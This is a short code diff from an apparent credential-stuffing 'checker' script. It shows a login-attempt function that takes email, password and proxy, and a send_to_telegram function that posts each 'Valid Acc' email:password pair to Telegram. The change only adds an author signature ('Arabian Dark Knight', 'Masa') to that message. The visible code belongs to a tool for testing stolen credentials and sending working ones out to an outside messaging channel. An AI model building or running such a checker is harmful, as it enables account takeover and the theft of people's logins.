@@ -41,8 +41,11 @@ def attempt_login(email, password, proxy, hits_file, local_hits_file):
 
 def send_to_telegram(email, password):
     message = f"""
-
-    Valid Acc : {email}:{password}
+    {
+    Done Checker By Arabian Dark Knight
+    🫡 By Masa
+    }
+     Valid Acc : {email}:{password}
 
 
     """
